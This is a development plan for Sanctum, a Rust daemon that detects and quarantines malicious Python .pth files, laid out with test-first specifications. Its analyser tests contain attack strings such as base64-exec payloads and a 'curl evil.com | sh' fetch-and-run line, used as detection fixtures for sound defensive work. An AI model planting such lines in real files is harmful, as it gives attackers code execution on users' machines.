# Sanctum Development Plan

## Phase 1: The Sentinel

### Red → Green TDD, formal verification, and exceptional security standards

---

## 0. Guiding principles

This is a security tool. The bar is higher than a normal application. Three non-negotiable constraints govern every decision:

**The tool itself must not be a supply chain risk.** Single static binary. Minimal dependencies, each individually audited. Reproducible builds. Sigstore attestation on every release. If Sanctum itself were compromised, the consequences would be severe — it runs as a daemon with filesystem access.

**Every security-critical path must have formal or semi-formal verification.** The .pth content analyser, the quarantine protocol, and the process lineage tracer each handle adversarial input. Property-based testing and, where feasible, model checking (via Kani) prove correctness beyond what unit tests can.

**Red → Green → Refactor is the only development workflow.** Every function begins as a failing test. The test describes the contract. The implementation satisfies the contract. Refactoring happens only when all tests pass. No exceptions, no "I'll add tests later."

---

## 1. Project structure

```
sanctum/
├── Cargo.toml                    # Workspace root
├── Cargo.lock                    # Committed, always
├── deny.toml                     # cargo-deny configuration
├── cliff.toml                    # git-cliff changelog config
├── .cargo/
│   └── config.toml               # Build hardening flags
├── crates/
│   ├── sanctum-daemon/           # Background daemon (main binary)
│   │   ├── Cargo.toml
│   │   ├── src/
│   │   │   ├── main.rs           # Entry point, signal handling, PID file
│   │   │   ├── daemon.rs         # Daemon lifecycle (start, stop, reload)
│   │   │   ├── ipc.rs            # Unix domain socket server
│   │   │   └── config.rs         # TOML config loading + validation
│   │   └── tests/
│   │       ├── daemon_lifecycle.rs
│   │       └── ipc_protocol.rs
│   ├── sanctum-cli/              # CLI client binary
│   │   ├── Cargo.toml
│   │   ├── src/
│   │   │   ├── main.rs           # Argument parsing, dispatch
│   │   │   ├── commands/
│   │   │   │   ├── init.rs
│   │   │   │   ├── status.rs
│   │   │   │   ├── review.rs
│   │   │   │   ├── scan.rs
│   │   │   │   ├── run.rs
│   │   │   │   └── config.rs
│   │   │   └── shell.rs          # Shell hook generation
│   │   └── tests/
│   │       ├── cli_integration.rs
│   │       └── shell_hooks.rs
│   ├── sanctum-sentinel/         # Core: .pth watcher + credential monitor
│   │   ├── Cargo.toml
│   │   ├── src/
│   │   │   ├── lib.rs
│   │   │   ├── watcher.rs        # Filesystem watcher (notify crate)
│   │   │   ├── pth/
│   │   │   │   ├── mod.rs
│   │   │   │   ├── analyser.rs   # .pth content analysis
│   │   │   │   ├── lineage.rs    # Process lineage tracing
│   │   │   │   └── quarantine.rs # Quarantine protocol
│   │   │   ├── credentials.rs    # Credential file access monitoring
│   │   │   └── allowlist.rs      # Package + hash allowlisting
│   │   └── tests/
│   │       ├── pth_analyser_tests.rs
│   │       ├── pth_lineage_tests.rs
│   │       ├── quarantine_tests.rs
│   │       ├── credential_monitor_tests.rs
│   │       ├── allowlist_tests.rs
│   │       └── property_tests.rs  # proptest / Kani harnesses
│   ├── sanctum-notify/           # Cross-platform notification abstraction
│   │   ├── Cargo.toml
│   │   ├── src/
│   │   │   ├── lib.rs
│   │   │   ├── macos.rs          # macOS notification centre
│   │   │   └── linux.rs          # D-Bus / notify-send
│   │   └── tests/
│   └── sanctum-types/            # Shared types, error types, constants
│       ├── Cargo.toml
│       ├── src/
│       │   ├── lib.rs
│       │   ├── threat.rs         # ThreatLevel enum, ThreatEvent struct
│       │   ├── config.rs         # Config structs (serde)
│       │   ├── errors.rs         # Error types (thiserror)
│       │   └── paths.rs          # Well-known paths, XDG compliance
│       └── tests/
│           └── config_validation.rs
├── tests/                        # End-to-end integration tests
│   ├── e2e_pth_detection.rs      # Full attack simulation
│   ├── e2e_daemon_lifecycle.rs
│   ├── e2e_quarantine_flow.rs
│   └── fixtures/
│       ├── benign_path_entry.pth
│       ├── benign_setuptools.pth
│       ├── malicious_base64.pth
│       ├── malicious_import.pth
│       ├── malicious_exec.pth
│       ├── malicious_subprocess.pth
│       ├── edge_case_unicode.pth
│       ├── edge_case_empty.pth
│       ├── edge_case_comments.pth
│       └── edge_case_very_long.pth
├── proofs/                       # Formal verification harnesses
│   ├── kani/
│   │   ├── pth_analyser.rs       # Kani proof harnesses
│   │   └── quarantine_state.rs
│   └── README.md
├── fuzz/                         # Cargo-fuzz targets
│   ├── Cargo.toml
│   └── fuzz_targets/
│       ├── fuzz_pth_analyser.rs
│       └── fuzz_config_parser.rs
├── scripts/
│   ├── install.sh                # Curl-pipe installer
│   ├── shell-hook.zsh
│   ├── shell-hook.bash
│   └── shell-hook.fish
└── docs/
    ├── SECURITY.md               # Security policy, vuln reporting
    ├── THREAT_MODEL.md            # Documented threat model
    ├── ARCHITECTURE.md            # ADRs and design decisions
    └── DEPENDENCY_AUDIT.md        # Justification for every dependency
```

---

## 2. Dependency inventory and audit policy

Every dependency must be justified, audited, and version-pinned. No transitive dependency is accepted without review.

### Direct dependencies (sanctum-sentinel)

| Crate | Version | Purpose | Audit status |
|---|---|---|---|
| `notify` | 7.0.x | Cross-platform filesystem events (inotify/FSEvent/ReadDirectoryChanges) | RustSec clean. Used by deno, zed, rust-analyzer. Audited. |
| `nix` | 0.29.x | Unix process management (/proc, signals, PID files) | RustSec clean. Core Rust ecosystem crate. Audited. |
| `serde` | 1.x | TOML config deserialisation | RustSec clean. Ubiquitous. |
| `toml` | 0.8.x | TOML parsing | RustSec clean. Official TOML parser. |
| `thiserror` | 2.x | Derive macro for error types | RustSec clean. Zero runtime cost. |
| `tracing` | 0.1.x | Structured logging | RustSec clean. Tokio project. |
| `secrecy` | 0.10.x | Zeroising wrapper for sensitive values | RustSec clean. Purpose-built for secrets in memory. |
| `sha2` | 0.10.x | SHA-256 for content hashing | RustCrypto project. Audited by multiple parties. |
| `hex` | 0.4.x | Hex encoding for hashes | Trivial, no unsafe. |

### Direct dependencies (sanctum-daemon)

| Crate | Version | Purpose | Audit status |
|---|---|---|---|
| `tokio` | 1.x | Async runtime (fs events, IPC, signals) | RustSec clean. Industry standard. |
| `clap` | 4.x | CLI argument parsing | RustSec clean. Standard CLI framework. |

### Direct dependencies (sanctum-notify)

| Crate | Version | Purpose | Audit status |
|---|---|---|---|
| `notify-rust` | 4.x | Desktop notifications (D-Bus on Linux, macOS native) | RustSec clean. Lightweight. |

### Development / test dependencies

| Crate | Version | Purpose |
|---|---|---|
| `proptest` | 1.x | Property-based testing |
| `tempfile` | 3.x | Temporary directories for integration tests |
| `assert_cmd` | 2.x | CLI integration testing |
| `predicates` | 3.x | Assertion predicates for CLI output |
| `cargo-fuzz` | (tool) | Fuzz testing harness |
| `kani-verifier` | (tool) | Bounded model checking |

### Banned crates (cargo-deny)

```toml
# deny.toml
[bans]
multiple-versions = "deny"
wildcards = "deny"
allow-wildcard-paths = false

[bans.deny]
# No C dependencies in the core library
name = "openssl-sys"
name = "libz-sys"

[licenses]
allow = ["MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause", "ISC", "Unicode-DFS-2016"]
```

---

## 3. Build hardening

```toml
# .cargo/config.toml
[build]
rustflags = [
    # Stack protection
    "-C", "overflow-checks=on",
    # Position-independent executable (ASLR)
    "-C", "relocation-model=pie",
    # Strip debug info in release (smaller binary, no symbol leaks)
    "-C", "strip=symbols",
    # Abort on panic (no unwinding = smaller attack surface)
    "-C", "panic=abort",
]

[profile.release]
opt-level = 3
lto = "fat"          # Link-time optimisation for single binary
codegen-units = 1    # Better optimisation, deterministic builds
strip = true
panic = "abort"

[profile.release.build-override]
opt-level = 3
```

### Compiler and toolchain

```toml
# rust-toolchain.toml
[toolchain]
channel = "1.82.0"   # Pinned, not "stable"
components = ["rustfmt", "clippy"]
```

### Linting (pre-commit, CI enforced)

```toml
# Clippy configuration in Cargo.toml workspace
[workspace.lints.clippy]
pedantic = { level = "warn" }
nursery = { level = "warn" }
unwrap_used = { level = "deny" }
expect_used = { level = "deny" }
panic = { level = "deny" }
todo = { level = "deny" }
dbg_macro = { level = "deny" }
print_stdout = { level = "deny" }   # Use tracing, not println
print_stderr = { level = "deny" }
```

The `unwrap_used = "deny"` and `expect_used = "deny"` rules are critical. A security daemon must never panic on malformed input. Every fallible operation uses `Result` with explicit error handling.

---

## 4. TDD test specifications

Tests are written FIRST, in the order they will be implemented. Each test name describes the contract it verifies. Each section lists the RED test (what we write first), then the GREEN implementation (what satisfies it).

### 4.1 sanctum-types (week 1, days 1-2)

These are the foundational types. They must be correct before anything else is built.

```rust
// tests/config_validation.rs

// --- RED: Threat level ordering ---
#[test]
fn threat_level_has_correct_ordering() {
    // ThreatLevel must be ordered: Info < Warning < Critical
    assert!(ThreatLevel::Info < ThreatLevel::Warning);
    assert!(ThreatLevel::Warning < ThreatLevel::Critical);
    assert!(ThreatLevel::Info < ThreatLevel::Critical);
}

// --- RED: Config deserialisation ---
#[test]
fn config_deserialises_from_minimal_toml() {
    let toml = r#"
        [sentinel]
        watch_pth = true
    "#;
    let config: SanctumConfig = toml::from_str(toml).unwrap();
    assert!(config.sentinel.watch_pth);
    // All other fields have sensible defaults
    assert_eq!(config.sentinel.pth_response, PthResponse::Quarantine);
}

#[test]
fn config_rejects_invalid_budget_format() {
    let toml = r#"
        [budgets]
        default_session = "fifty dollars"
    "#;
    let result: Result<SanctumConfig, _> = toml::from_str(toml);
    assert!(result.is_err());
}

#[test]
fn config_rejects_negative_budget() {
    let toml = r#"
        [budgets]
        default_session = "$-50"
    "#;
    let result: Result<SanctumConfig, _> = toml::from_str(toml);
    assert!(result.is_err());
}

#[test]
fn well_known_paths_are_platform_appropriate() {
    let paths = WellKnownPaths::default();
    // On Unix, SSH dir should be ~/.ssh
    assert!(paths.ssh_dir.ends_with(".ssh"));
    // Sanctum data dir follows XDG on Linux, ~/Library on macOS
    #[cfg(target_os = "linux")]
    assert!(paths.data_dir.to_string_lossy().contains(".local/share/sanctum"));
    #[cfg(target_os = "macos")]
    assert!(paths.data_dir.to_string_lossy().contains("Library/Application Support/sanctum"));
}

#[test]
fn threat_event_serialises_to_json_for_audit_log() {
    let event = ThreatEvent {
        timestamp: Utc::now(),
        level: ThreatLevel::Critical,
        category: ThreatCategory::PthInjection,
        description: "Executable .pth with base64".into(),
        source_path: PathBuf::from("/usr/lib/python3.12/site-packages/evil.pth"),
        creator_pid: Some(12345),
        creator_exe: Some(PathBuf::from("/usr/bin/python3.12")),
        action_taken: Action::Quarantined,
    };
    let json = serde_json::to_string(&event).unwrap();
    assert!(json.contains("PthInjection"));
    assert!(json.contains("Quarantined"));
}
```

### 4.2 sanctum-sentinel: .pth content analyser (week 1, days 3-5)

This is the most security-critical module. Every line of `.pth` content must be classified correctly.

```rust
// tests/pth_analyser_tests.rs

// ============================================================
// BENIGN CASES: must NOT trigger alerts
// ============================================================

#[test]
fn benign_simple_path_entry() {
    let result = analyse_pth_line("/usr/lib/python3.12/dist-packages/pkg");
    assert_eq!(result, PthVerdict::Benign);
}

#[test]
fn benign_relative_path_entry() {
    let result = analyse_pth_line("../shared/packages");
    assert_eq!(result, PthVerdict::Benign);
}

#[test]
fn benign_dot_prefixed_path() {
    let result = analyse_pth_line("./local_packages");
    assert_eq!(result, PthVerdict::Benign);
}

#[test]
fn benign_empty_line() {
    let result = analyse_pth_line("");
    assert_eq!(result, PthVerdict::Benign);
}

#[test]
fn benign_comment_line() {
    // Lines starting with # are comments in .pth files
    let result = analyse_pth_line("# This is a comment");
    assert_eq!(result, PthVerdict::Benign);
}

#[test]
fn benign_windows_style_path() {
    let result = analyse_pth_line("C:\\Python312\\Lib\\site-packages\\pkg");
    assert_eq!(result, PthVerdict::Benign);
}

#[test]
fn benign_path_with_spaces() {
    let result = analyse_pth_line("/home/user/my projects/packages");
    assert_eq!(result, PthVerdict::Benign);
}

#[test]
fn benign_path_with_hyphens_and_dots() {
    let result = analyse_pth_line("/usr/lib/python3.12/dist-packages/my-package.2.0");
    assert_eq!(result, PthVerdict::Benign);
}

// ============================================================
// WARNING CASES: executable but potentially legitimate
// ============================================================

#[test]
fn warning_simple_import() {
    // Some legitimate packages use "import pkg_resources" in .pth
    let result = analyse_pth_line("import pkg_resources; pkg_resources.fixup_namespace_packages('')");
    assert_eq!(result.level(), ThreatLevel::Warning);
}

#[test]
fn warning_import_with_leading_whitespace() {
    let result = analyse_pth_line("  import setuptools");
    assert_eq!(result.level(), ThreatLevel::Warning);
}

#[test]
fn warning_import_tab_separated() {
    let result = analyse_pth_line("import\tpkg_resources");
    assert_eq!(result.level(), ThreatLevel::Warning);
}

// ============================================================
// CRITICAL CASES: must ALWAYS trigger (the attack patterns)
// ============================================================

#[test]
fn critical_base64_exec_pattern() {
    // The exact LiteLLM attack pattern
    let result = analyse_pth_line(
        r#"import base64;exec(base64.b64decode("aW1wb3J0IG9z..."))"#
    );
    assert_eq!(result.level(), ThreatLevel::Critical);
    assert!(result.reasons().contains(&"base64"));
    assert!(result.reasons().contains(&"exec"));
}

#[test]
fn critical_eval_pattern() {
    let result = analyse_pth_line(r#"import os; eval(os.environ.get('PAYLOAD'))"#);
    assert_eq!(result.level(), ThreatLevel::Critical);
}

#[test]
fn critical_subprocess_pattern() {
    let result = analyse_pth_line(
        "import subprocess; subprocess.Popen(['curl', 'evil.com'])"
    );
    assert_eq!(result.level(), ThreatLevel::Critical);
}

#[test]
fn critical_dunder_import_pattern() {
    let result = analyse_pth_line("__import__('os').system('curl evil.com | sh')");
    assert_eq!(result.level(), ThreatLevel::Critical);
}

#[test]
fn critical_compile_exec_pattern() {
    let result = analyse_pth_line(
        "exec(compile(open('/tmp/payload.py').read(), '<string>', 'exec'))"
    );
    assert_eq!(result.level(), ThreatLevel::Critical);
}

#[test]
fn critical_obfuscated_with_chr_concat() {
    // Attacker might try chr() concatenation to avoid string matching
    let result = analyse_pth_line(
        "exec(''.join([chr(105),chr(109),chr(112),chr(111)]))"
    );
    assert_eq!(result.level(), ThreatLevel::Critical);
    // exec() alone is sufficient for critical
}

#[test]
fn critical_multiline_semicolon_chain() {
    let result = analyse_pth_line(
        "import os;import base64;exec(base64.b64decode(os.environ['P']))"
    );
    assert_eq!(result.level(), ThreatLevel::Critical);
}

// ============================================================
// EVASION RESISTANCE: adversarial input the attacker might try
// ============================================================

#[test]
fn evasion_unicode_homoglyph_import() {
    // Attacker uses Unicode lookalikes for "import"
    // U+0456 (Cyrillic і) instead of ASCII i
    let result = analyse_pth_line("іmport os");
    // Should still flag as suspicious — non-ASCII in executable context
    assert!(result.level() >= ThreatLevel::Warning);
}

#[test]
fn evasion_null_bytes() {
    // Null bytes might confuse string matching
    let result = analyse_pth_line("import\x00 base64;exec(base64.b64decode('..'))");
    assert_eq!(result.level(), ThreatLevel::Critical);
}

#[test]
fn evasion_very_long_line() {
    // 1MB line of garbage with exec() buried in the middle
    let mut line = "a".repeat(500_000);
    line.push_str("exec(base64.b64decode('payload'))");
    line.push_str(&"b".repeat(500_000));
    let result = analyse_pth_line(&line);
    assert_eq!(result.level(), ThreatLevel::Critical);
}

#[test]
fn evasion_mixed_case_does_not_bypass() {
    // Python's exec() is case-sensitive, but we should flag EXEC() 
    // as suspicious anyway (unusual in legitimate code)
    let result = analyse_pth_line("EXEC(base64.b64decode('payload'))");
    // At minimum Warning, as this is not a normal path entry
    assert!(result.level() >= ThreatLevel::Warning);
}

// ============================================================
// WHOLE-FILE ANALYSIS
// ============================================================

#[test]
fn analyse_whole_file_benign() {
    let content = "/usr/lib/python3.12/dist-packages/pkg\n\
                   /usr/lib/python3.12/dist-packages/other\n";
    let result = analyse_pth_file(content);
    assert_eq!(result.verdict, FileVerdict::Safe);
}

#[test]
fn analyse_whole_file_with_one_critical_line() {
    let content = "/usr/lib/python3.12/dist-packages/pkg\n\
                   import base64;exec(base64.b64decode('...'))\n\
                   /usr/lib/python3.12/dist-packages/other\n";
    let result = analyse_pth_file(content);
    assert_eq!(result.verdict, FileVerdict::Critical);
    assert_eq!(result.critical_lines.len(), 1);
    assert_eq!(result.critical_lines[0].line_number, 2);
}

#[test]
fn analyse_whole_file_known_setuptools() {
    // setuptools' .pth has a legitimate import line
    let content = "import _virtualenv";
    let result = analyse_pth_file_with_context(content, "virtualenv", "sha256:known_hash");
    assert_eq!(result.verdict, FileVerdict::AllowlistedKnownPackage);
}
```

### 4.3 sanctum-sentinel: process lineage tracer (week 2, days 1-3)

```rust
// tests/pth_lineage_tests.rs

#[test]
fn lineage_identifies_pip_as_root_ancestor() {
    // Mock /proc filesystem with a process tree:
    // pip (PID 100) → python (PID 101) → [.pth creator]
    let mock_proc = MockProcFs::new()
        .process(100, "pip", None)
        .process(101, "/usr/bin/python3.12", Some(100));
    
    let lineage = ProcessLineage::trace(101, &mock_proc).unwrap();
    assert!(lineage.has_ancestor_named("pip"));
    assert_eq!(lineage.root_ancestor().name(), "pip");
}

#[test]
fn lineage_identifies_poetry_as_root_ancestor() {
    let mock_proc = MockProcFs::new()
        .process(50, "poetry", None)
        .process(51, "python3", Some(50))
        .process(52, "pip", Some(51));
    
    let lineage = ProcessLineage::trace(52, &mock_proc).unwrap();
    assert!(lineage.has_ancestor_named("poetry"));
}

#[test]
fn lineage_flags_python_startup_creating_pth() {
    // Process tree where Python interpreter itself is creating .pth
    // (indicates a .pth file's code is spawning more .pth files)
    let mock_proc = MockProcFs::new()
        .process(1, "zsh", None)
        .process(100, "python3.12", Some(1));
    
    let lineage = ProcessLineage::trace(100, &mock_proc).unwrap();
    let assessment = lineage.assess_pth_creation();
    assert_eq!(assessment, LineageAssessment::SuspiciousPythonStartup);
}

#[test]
fn lineage_handles_process_that_already_exited() {
    // The creating process might have exited by the time we check
    let mock_proc = MockProcFs::new(); // empty — process gone
    
    let lineage = ProcessLineage::trace(99999, &mock_proc);
    assert!(lineage.is_err());
    // Error should indicate process not found, not panic
}

#[test]
fn lineage_handles_circular_parent_references() {
    // Defensive: malformed /proc with circular PPIDs
    let mock_proc = MockProcFs::new()
        .process(100, "python3", Some(101))
        .process(101, "python3", Some(100));
    
    let lineage = ProcessLineage::trace(100, &mock_proc);
    // Must terminate, not infinite loop. Max depth = 64.
    assert!(lineage.is_ok());
    assert!(lineage.unwrap().depth() <= 64);
}

#[test]
fn lineage_known_package_managers() {
    // All of these should be recognised as legitimate
    for name in &["pip", "pip3", "poetry", "uv", "conda", "pdm", "pipx", 
                  "pip-compile", "pip-sync"] {
        assert!(
            is_known_package_manager(name),
            "{name} should be recognised as a package manager"
        );
    }
}

#[test]
fn lineage_unknown_process_not_recognised() {
    assert!(!is_known_package_manager("curl"));
    assert!(!is_known_package_manager("python3"));
    assert!(!is_known_package_manager("bash"));
}
```

### 4.4 sanctum-sentinel: quarantine protocol (week 2, days 4-5)

```rust
// tests/quarantine_tests.rs

#[test]
fn quarantine_moves_file_to_quarantine_dir() {
    let dir = tempdir().unwrap();
    let pth_path = dir.path().join("site-packages/evil.pth");
    fs::create_dir_all(pth_path.parent().unwrap()).unwrap();
    fs::write(&pth_path, "import base64;exec(...)").unwrap();
    
    let q = Quarantine::new(dir.path().join(".sanctum/quarantine"));
    let result = q.quarantine_file(&pth_path, &QuarantineMetadata {
        original_path: pth_path.clone(),
        content_hash: "sha256:abc123".into(),
        creator_pid: Some(12345),
        reason: "Executable .pth with base64 obfuscation".into(),
    }).unwrap();
    
    // Original file replaced with empty stub
    assert!(pth_path.exists());
    assert_eq!(fs::read_to_string(&pth_path).unwrap(), "");
    
    // Quarantined copy exists
    assert!(result.quarantine_path.exists());
    assert_eq!(
        fs::read_to_string(&result.quarantine_path).unwrap(),
        "import base64;exec(...)"
    );
    
    // Metadata file exists alongside
    let meta_path = result.quarantine_path.with_extension("json");
    assert!(meta_path.exists());
}

#[test]
fn quarantine_is_idempotent() {
    // Quarantining the same file twice should not error
    let dir = tempdir().unwrap();
    let pth_path = dir.path().join("evil.pth");
    fs::write(&pth_path, "exec(...)").unwrap();
    
    let q = Quarantine::new(dir.path().join("quarantine"));
    q.quarantine_file(&pth_path, &default_meta()).unwrap();
    
    // Second quarantine: file is now empty (the stub)
    let result = q.quarantine_file(&pth_path, &default_meta());
    // Should succeed (quarantine the empty stub) or return AlreadyQuarantined
    assert!(result.is_ok());
}

#[test]
fn quarantine_preserves_original_permissions() {
    let dir = tempdir().unwrap();
    let pth_path = dir.path().join("evil.pth");
    fs::write(&pth_path, "exec(...)").unwrap();
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&pth_path, fs::Permissions::from_mode(0o644)).unwrap();
    }
    
    let q = Quarantine::new(dir.path().join("quarantine"));
    q.quarantine_file(&pth_path, &default_meta()).unwrap();
    
    // Stub file should have same permissions as original
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(fs::metadata(&pth_path).unwrap().permissions().mode() & 0o777, 0o644);
    }
}

#[test]
fn quarantine_restore_puts_file_back() {
    let dir = tempdir().unwrap();
    let pth_path = dir.path().join("evil.pth");
    let content = "import setuptools";
    fs::write(&pth_path, content).unwrap();
    
    let q = Quarantine::new(dir.path().join("quarantine"));
    let entry = q.quarantine_file(&pth_path, &default_meta()).unwrap();
    
    // Now restore
    q.restore(&entry.id).unwrap();
    assert_eq!(fs::read_to_string(&pth_path).unwrap(), content);
}

#[test]
fn quarantine_delete_removes_quarantined_file() {
    let dir = tempdir().unwrap();
    let pth_path = dir.path().join("evil.pth");
    fs::write(&pth_path, "exec(...)").unwrap();
    
    let q = Quarantine::new(dir.path().join("quarantine"));
    let entry = q.quarantine_file(&pth_path, &default_meta()).unwrap();
    
    q.delete(&entry.id).unwrap();
    assert!(!entry.quarantine_path.exists());
    // Original location still has the empty stub
    assert_eq!(fs::read_to_string(&pth_path).unwrap(), "");
}

#[test]
fn quarantine_list_returns_all_entries() {
    let dir = tempdir().unwrap();
    let q = Quarantine::new(dir.path().join("quarantine"));
    
    for i in 0..3 {
        let path = dir.path().join(format!("evil_{i}.pth"));
        fs::write(&path, "exec(...)").unwrap();
        q.quarantine_file(&path, &default_meta()).unwrap();
    }
    
    assert_eq!(q.list().unwrap().len(), 3);
}

#[test]
fn quarantine_handles_read_only_directory() {
    // If site-packages is read-only, quarantine should fail gracefully
    let dir = tempdir().unwrap();
    let pth_path = dir.path().join("readonly/evil.pth");
    fs::create_dir_all(pth_path.parent().unwrap()).unwrap();
    fs::write(&pth_path, "exec(...)").unwrap();
    
    // Make directory read-only
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(
            pth_path.parent().unwrap(),
            fs::Permissions::from_mode(0o555),
        ).unwrap();
    }
    
    let q = Quarantine::new(dir.path().join("quarantine"));
    let result = q.quarantine_file(&pth_path, &default_meta());
    
    // Should return an error, not panic
    assert!(result.is_err());
    
    // Clean up
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(
            pth_path.parent().unwrap(),
            fs::Permissions::from_mode(0o755),
        ).unwrap();
    }
}
```

### 4.5 sanctum-sentinel: filesystem watcher integration (week 3, days 1-3)

```rust
// tests/watcher_integration.rs

#[tokio::test]
async fn watcher_detects_new_pth_in_site_packages() {
    let dir = tempdir().unwrap();
    let site_packages = dir.path().join("site-packages");
    fs::create_dir_all(&site_packages).unwrap();
    
    let (tx, mut rx) = tokio::sync::mpsc::channel(16);
    let _watcher = PthWatcher::start(vec![site_packages.clone()], tx).unwrap();
    
    // Allow watcher to initialise
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    // Create a .pth file
    fs::write(site_packages.join("test.pth"), "/some/path").unwrap();
    
    // Should receive an event
    let event = tokio::time::timeout(Duration::from_secs(2), rx.recv())
        .await
        .expect("timeout waiting for event")
        .expect("channel closed");
    
    assert_eq!(event.path, site_packages.join("test.pth"));
    assert_eq!(event.kind, WatchEventKind::Created);
}

#[tokio::test]
async fn watcher_ignores_non_pth_files() {
    let dir = tempdir().unwrap();
    let site_packages = dir.path().join("site-packages");
    fs::create_dir_all(&site_packages).unwrap();
    
    let (tx, mut rx) = tokio::sync::mpsc::channel(16);
    let _watcher = PthWatcher::start(vec![site_packages.clone()], tx).unwrap();
    
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    // Create non-.pth files
    fs::write(site_packages.join("module.py"), "# python").unwrap();
    fs::write(site_packages.join("data.json"), "{}").unwrap();
    
    // Should NOT receive events for these
    let result = tokio::time::timeout(Duration::from_millis(500), rx.recv()).await;
    assert!(result.is_err(), "should not have received event for non-.pth file");
}

#[tokio::test]
async fn watcher_detects_sitecustomize_creation() {
    let dir = tempdir().unwrap();
    let site_packages = dir.path().join("site-packages");
    fs::create_dir_all(&site_packages).unwrap();
    
    let (tx, mut rx) = tokio::sync::mpsc::channel(16);
    let _watcher = PthWatcher::start(vec![site_packages.clone()], tx).unwrap();
    
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    fs::write(site_packages.join("sitecustomize.py"), "import os").unwrap();
    
    let event = tokio::time::timeout(Duration::from_secs(2), rx.recv())
        .await
        .expect("timeout")
        .expect("channel closed");
    
    assert!(event.path.ends_with("sitecustomize.py"));
}

#[tokio::test]
async fn watcher_survives_watched_directory_deletion() {
    let dir = tempdir().unwrap();
    let site_packages = dir.path().join("site-packages");
    fs::create_dir_all(&site_packages).unwrap();
    
    let (tx, _rx) = tokio::sync::mpsc::channel(16);
    let watcher = PthWatcher::start(vec![site_packages.clone()], tx).unwrap();
    
    // Delete the watched directory
    fs::remove_dir_all(&site_packages).unwrap();
    
    // Watcher should not crash. It should log the loss and continue.
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert!(watcher.is_alive());
}

#[tokio::test]
async fn watcher_discovers_python_site_packages_automatically() {
    // When no explicit paths configured, watcher should discover
    // all site-packages directories from `python -c "import site; print(site.getsitepackages())"`
    let paths = discover_site_packages().await;
    // Should find at least one (system Python is almost always present)
    // This test is environment-dependent; skip in CI if no Python
    if which::which("python3").is_ok() {
        assert!(!paths.is_empty());
        for p in &paths {
            assert!(p.exists());
        }
    }
}
```

### 4.6 sanctum-daemon: lifecycle and IPC (week 3, days 4-5; week 4, days 1-2)

```rust
// tests/daemon_lifecycle.rs

#[test]
fn daemon_creates_pid_file_on_start() {
    let dir = tempdir().unwrap();
    let pid_file = dir.path().join("sanctum.pid");
    
    let daemon = TestDaemon::start(&pid_file).unwrap();
    
    assert!(pid_file.exists());
    let pid: u32 = fs::read_to_string(&pid_file).unwrap().trim().parse().unwrap();
    assert!(pid > 0);
    
    daemon.stop().unwrap();
    assert!(!pid_file.exists());
}

#[test]
fn daemon_refuses_to_start_if_already_running() {
    let dir = tempdir().unwrap();
    let pid_file = dir.path().join("sanctum.pid");
    
    let daemon1 = TestDaemon::start(&pid_file).unwrap();
    let result = TestDaemon::start(&pid_file);
    
    assert!(matches!(result, Err(DaemonError::AlreadyRunning(_))));
    
    daemon1.stop().unwrap();
}

#[test]
fn daemon_cleans_stale_pid_file() {
    let dir = tempdir().unwrap();
    let pid_file = dir.path().join("sanctum.pid");
    
    // Write a PID that doesn't correspond to a running process
    fs::write(&pid_file, "99999999").unwrap();
    
    // Daemon should detect stale PID and start anyway
    let daemon = TestDaemon::start(&pid_file).unwrap();
    assert!(daemon.is_alive());
    daemon.stop().unwrap();
}

#[test]
fn daemon_handles_sigterm_gracefully() {
    let dir = tempdir().unwrap();
    let pid_file = dir.path().join("sanctum.pid");
    
    let daemon = TestDaemon::start(&pid_file).unwrap();
    let pid = daemon.pid();
    
    // Send SIGTERM
    nix::sys::signal::kill(
        nix::unistd::Pid::from_raw(pid as i32),
        nix::sys::signal::Signal::SIGTERM,
    ).unwrap();
    
    // Wait for graceful shutdown
    std::thread::sleep(Duration::from_secs(1));
    
    // PID file should be cleaned up
    assert!(!pid_file.exists());
}

// tests/ipc_protocol.rs

#[tokio::test]
async fn ipc_status_returns_daemon_info() {
    let dir = tempdir().unwrap();
    let socket_path = dir.path().join("sanctum.sock");
    
    let daemon = TestDaemon::start_with_socket(&socket_path).unwrap();
    
    let client = IpcClient::connect(&socket_path).await.unwrap();
    let status = client.send(IpcCommand::Status).await.unwrap();
    
    assert!(matches!(status, IpcResponse::Status { .. }));
    if let IpcResponse::Status { version, uptime_secs, watchers_active, .. } = status {
        assert_eq!(version, env!("CARGO_PKG_VERSION"));
        assert!(uptime_secs >= 0);
        assert!(watchers_active >= 0);
    }
    
    daemon.stop().unwrap();
}

#[tokio::test]
async fn ipc_rejects_oversized_messages() {
    // Defence against IPC-based DoS
    let dir = tempdir().unwrap();
    let socket_path = dir.path().join("sanctum.sock");
    
    let daemon = TestDaemon::start_with_socket(&socket_path).unwrap();
    
    // Try to send a 10MB message
    let stream = tokio::net::UnixStream::connect(&socket_path).await.unwrap();
    let huge_payload = vec![0u8; 10_000_000];
    // The daemon should reject this before fully reading it
    // (max message size = 64KB)
    
    daemon.stop().unwrap();
}

#[tokio::test]
async fn ipc_socket_permissions_are_owner_only() {
    let dir = tempdir().unwrap();
    let socket_path = dir.path().join("sanctum.sock");
    
    let daemon = TestDaemon::start_with_socket(&socket_path).await.unwrap();
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = fs::metadata(&socket_path).unwrap().permissions();
        // Socket should be owner-only (0o700 or 0o600)
        assert_eq!(perms.mode() & 0o077, 0);
    }
    
    daemon.stop().unwrap();
}
```

### 4.7 sanctum-cli: commands and shell integration (week 4, days 3-5)

```rust
// tests/cli_integration.rs

#[test]
fn cli_init_creates_config_file() {
    let dir = tempdir().unwrap();
    
    Command::cargo_bin("sanctum")
        .unwrap()
        .args(["init", "--dir", dir.path().to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicates::str::contains("Sanctum initialised"));
    
    assert!(dir.path().join(".sanctum/config.toml").exists());
}

#[test]
fn cli_init_does_not_overwrite_existing_config() {
    let dir = tempdir().unwrap();
    let config_path = dir.path().join(".sanctum/config.toml");
    fs::create_dir_all(config_path.parent().unwrap()).unwrap();
    fs::write(&config_path, "[sentinel]\nwatch_pth = false\n").unwrap();
    
